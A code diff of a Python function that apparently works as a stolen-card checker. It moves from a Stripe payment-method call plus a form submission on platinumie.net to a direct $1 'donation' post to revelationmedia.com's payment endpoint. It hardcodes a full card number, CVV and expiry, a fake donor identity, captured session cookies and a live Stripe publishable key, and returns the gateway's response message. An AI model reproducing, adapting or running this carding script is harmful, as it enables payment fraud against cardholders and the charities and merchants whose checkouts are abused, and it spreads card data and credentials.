@@ -14,35 +14,24 @@ def Tele(ccx):
 	random2 = random.randint(1, 99)
 	random3 = random.randint(20, 999)
 	
-	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
-	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	cookies = {
+	    '__cf_bm': 'YuY1XaSL_lsrsP8IB7I2GBIilo307RubQjbod.bxgbQ-1776313301-1.0.1.1-sbOw94gU9cSyuK2be.5DNWzUsYWQKeyP6KFQUKpf7pBcQVo.xtapd5c0nfggrzN3o_HaznzwZsQIHlKzo6XsxUWSH.pWfQy9xSQenUAsWS0',
+	    '_cfuvid': 'qzTufKJ44MjrW_61dW827QYl7IopMVQFUHZXFWlGA.o-1776313301484-0.0.1.1-604800000',
+	    '_fbp': 'fb.1.1776313304366.205384764409182557',
+	    '__hstc': '164235424.9bbfcb6ee5bbceab45a6187fea12667f.1776313305991.1776313305991.1776313305991.1',
+	    'hubspotutk': '9bbfcb6ee5bbceab45a6187fea12667f',
+	    '__hssrc': '1',
+	    '__hssc': '164235424.1.1776313305993',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff93cb2e34f%3B+stripe-js-v3%2Ff93cb2e34f%3B+card-element&referrer=https%3A%2F%2Fplatinumie.net&time_on_page=52749&client_attribution_metadata[client_session_id]=1c3e64be-c47c-4ee0-8cc4-26c3d17a1a93&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=2b5396f3-c60a-4760-92aa-453c892b7a00&key=pk_live_518MVTVAuNIofUrAYO7iUYiZ91pQzdQOM4kaTbHub1iMIcYPxjwZ73s1RUGdHuelJEx67MrzxQHImXEejxtKnhBRC002hFcBHOb'
-	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
-	pm = response.json()['id']
-	
 	headers = {
-	    'authority': 'platinumie.net',
+	    'authority': 'revelationmedia.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://platinumie.net',
-	    'referer': 'https://platinumie.net/happy-kickers/happy-kickers-payment-portals/',
+	    'content-type': 'application/json',
+	    # 'cookie': '__cf_bm=YuY1XaSL_lsrsP8IB7I2GBIilo307RubQjbod.bxgbQ-1776313301-1.0.1.1-sbOw94gU9cSyuK2be.5DNWzUsYWQKeyP6KFQUKpf7pBcQVo.xtapd5c0nfggrzN3o_HaznzwZsQIHlKzo6XsxUWSH.pWfQy9xSQenUAsWS0; _cfuvid=qzTufKJ44MjrW_61dW827QYl7IopMVQFUHZXFWlGA.o-1776313301484-0.0.1.1-604800000; _fbp=fb.1.1776313304366.205384764409182557; __hstc=164235424.9bbfcb6ee5bbceab45a6187fea12667f.1776313305991.1776313305991.1776313305991.1; hubspotutk=9bbfcb6ee5bbceab45a6187fea12667f; __hssrc=1; __hssc=164235424.1.1776313305993',
+	    'origin': 'https://revelationmedia.com',
+	    'referer': 'https://revelationmedia.com/donation',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -50,19 +39,45 @@ def Tele(ccx):
 	    'sec-fetch-mode': 'cors',
 	    'sec-fetch-site': 'same-origin',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	params = {
-	    't': '1776043065926',
+	json_data = {
+	    'firstName': 'Gen',
+	    'lastName': 'Paypal',
+	    'email': 'genpaypal01@gmail.com',
+	    'phone': '+66817480630',
+	    'donationMethod': 'Credit Card',
+	    'amount': '1',
+	    'campaign': 'Revelation Media',
+	    'projectName': 'RevelationMedia - General',
+	    'donationFrequency': 'onetime',
+	    'sandbox': False,
+	    'source_code': 'RevelationMedia',
+	    'billingAddress': '27 Allen St',
+	    'billingCity': 'New York',
+	    'billingState': 'AL',
+	    'billingZip': '10002',
+	    'billingCountry': 'US',
+	    'shippingFirstName': '',
+	    'shippingLastName': '',
+	    'shippingAddress': '',
+	    'shippingCity': '',
+	    'shippingState': '',
+	    'shippingCountry': '',
+	    'cardName': 'Gen Paypal',
+	    'cardNumber': '4391370000682381',
+	    'cardCvv': '516',
+	    'expiryMonth': '06',
+	    'expiryYear': '2027',
 	}
 	
-	data = {
-	    'data': f'__fluent_form_embded_post_id=2315&_fluentform_12_fluentformnonce=c9664ef17d&_wp_http_referer=%2Fhappy-kickers%2Fhappy-kickers-payment-portals%2F&numeric-field=1.00&names%5Bfirst_name%5D=John&names%5Blast_name%5D=Lan&email=yellhtetgaung2106{random2}%40gmail.com&input_text_1=Ella&description=&custom-payment-amount=1&custom-payment-amount_2=0.03505&payment_method=stripe&input_radio=May&__stripe_payment_method_id={pm}',
-	    'action': 'fluentform_submit',
-	    'form_id': '12',
-	}
+	response = requests.post(
+	    'https://revelationmedia.com/_hcms/api/authorize_payment_sandbox',
+	    #cookies=cookies,
+	    headers=headers,
+	    json=json_data,
+	)
 	
-	response = requests.post('https://platinumie.net/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
+	result = response.json()['message']
 	
-	return response.text
+	return result
